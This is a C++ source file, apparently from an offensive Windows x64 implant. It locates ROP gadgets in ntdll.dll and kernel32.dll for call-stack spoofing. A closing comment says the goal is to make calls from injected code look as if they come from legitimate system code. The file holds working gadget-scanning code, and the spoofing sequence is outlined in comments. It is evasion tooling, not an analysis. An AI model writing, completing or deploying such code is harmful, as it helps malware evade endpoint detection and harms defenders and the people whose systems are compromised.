#include "stdafx.h"
#include "stack_spoof.h"
#include "logger.h"

namespace StackSpoof {

namespace {
    PVOID g_gadgetAddRspRet = nullptr;  // 'add rsp, XX; ret' gadget
    PVOID g_gadgetJmpRbx = nullptr;     // 'jmp rbx' gadget for indirection
    bool g_initialized = false;

    // Get the .text section bounds of a loaded module for safe scanning.
    bool GetTextSectionBounds(HMODULE hModule, PBYTE& pStart, size_t& size) {
        auto pDosHdr = reinterpret_cast<PIMAGE_DOS_HEADER>(hModule);
        auto pNtHdr = reinterpret_cast<PIMAGE_NT_HEADERS>(
            reinterpret_cast<PBYTE>(hModule) + pDosHdr->e_lfanew);

        auto pSection = IMAGE_FIRST_SECTION(pNtHdr);
        for (WORD i = 0; i < pNtHdr->FileHeader.NumberOfSections; i++, pSection++) {
            if (memcmp(pSection->Name, ".text", 5) == 0) {
                pStart = reinterpret_cast<PBYTE>(hModule) + pSection->VirtualAddress;
                size = pSection->Misc.VirtualSize;
                return true;
            }
        }
        return false;
    }

    // Scan for a byte pattern within a memory region.
    // Returns the address of the first match, or nullptr.
    PVOID FindGadget(PBYTE pStart, size_t regionSize,
                     const BYTE* pattern, size_t patternSize) {
        if (regionSize < patternSize) return nullptr;
        size_t limit = regionSize - patternSize;
        for (size_t i = 0; i <= limit; i++) {
            if (memcmp(pStart + i, pattern, patternSize) == 0) {
                return pStart + i;
            }
        }
        return nullptr;
    }
}

bool Initialize() {
    if (g_initialized) return true;

#ifdef _M_AMD64
    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
    if (!hNtdll) return false;

    PBYTE pTextStart = nullptr;
    size_t textSize = 0;
    if (!GetTextSectionBounds(hNtdll, pTextStart, textSize)) {
        LOG(L"StackSpoof: Failed to find .text section in ntdll.dll");
        return false;
    }

    // Search for 'jmp rbx' gadget (FF E3)
    {
        const BYTE pattern[] = { 0xFF, 0xE3 };
        g_gadgetJmpRbx = FindGadget(pTextStart, textSize, pattern, sizeof(pattern));
    }

    // Search for 'add rsp, 0x?8; ret' gadget
    // Common patterns: 48 83 C4 XX C3 (add rsp, imm8; ret)
    // We look for add rsp with various stack sizes, preferring 0x28 (5 slots)
    {
        // Prefer: add rsp, 28h; ret (48 83 C4 28 C3)
        const BYTE preferred[] = { 0x48, 0x83, 0xC4, 0x28, 0xC3 };
        g_gadgetAddRspRet = FindGadget(pTextStart, textSize, preferred, sizeof(preferred));

        if (!g_gadgetAddRspRet) {
            // Fallback: add rsp, 38h; ret (48 83 C4 38 C3)
            const BYTE fallback[] = { 0x48, 0x83, 0xC4, 0x38, 0xC3 };
            g_gadgetAddRspRet = FindGadget(pTextStart, textSize, fallback, sizeof(fallback));
        }

        if (!g_gadgetAddRspRet) {
            // Final fallback: add rsp, 48h; ret (48 83 C4 48 C3)
            const BYTE final_fb[] = { 0x48, 0x83, 0xC4, 0x48, 0xC3 };
            g_gadgetAddRspRet = FindGadget(pTextStart, textSize, final_fb, sizeof(final_fb));
        }
    }

    if (g_gadgetJmpRbx && g_gadgetAddRspRet) {
        g_initialized = true;
        VERBOSE(L"StackSpoof: Initialized — jmp rbx @ %p, add rsp,XX;ret @ %p",
                g_gadgetJmpRbx, g_gadgetAddRspRet);
        return true;
    }

    // If we couldn't find both, try kernel32.dll as a secondary source
    HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");
    if (hKernel32 && GetTextSectionBounds(hKernel32, pTextStart, textSize)) {
        if (!g_gadgetJmpRbx) {
            const BYTE pattern[] = { 0xFF, 0xE3 };
            g_gadgetJmpRbx = FindGadget(pTextStart, textSize, pattern, sizeof(pattern));
        }
        if (!g_gadgetAddRspRet) {
            const BYTE preferred[] = { 0x48, 0x83, 0xC4, 0x28, 0xC3 };
            g_gadgetAddRspRet = FindGadget(pTextStart, textSize, preferred, sizeof(preferred));
        }
    }

    g_initialized = (g_gadgetJmpRbx != nullptr && g_gadgetAddRspRet != nullptr);
    if (g_initialized) {
        VERBOSE(L"StackSpoof: Initialized (fallback) — jmp rbx @ %p, add rsp,XX;ret @ %p",
                g_gadgetJmpRbx, g_gadgetAddRspRet);
    } else {
        LOG(L"StackSpoof: Failed to find required gadgets (jmpRbx=%p, addRspRet=%p)",
            g_gadgetJmpRbx, g_gadgetAddRspRet);
    }

    return g_initialized;
#else
    // Stack spoofing is only implemented for x64
    LOG(L"StackSpoof: Not supported on this architecture");
    return false;
#endif
}

// Note: The actual SpoofCall assembly requires an external .asm file
// for reliable stack manipulation on MSVC x64 (which doesn't support
// inline assembly). The compiled .asm would use the gadgets found by
// Initialize() to construct a synthetic call stack:
//
// 1. Save the real return address
// 2. Push fake return frames pointing to the 'add rsp,XX; ret' gadget
// 3. At the bottom, set up a frame returning through 'jmp rbx'
// 4. Call the target function
// 5. On return, the gadget chain unwinds the synthetic frames
// 6. Restore the real return address and return to the caller
//
// This makes the call stack appear to originate from legitimate
// system code rather than injected code.

} // namespace StackSpoof

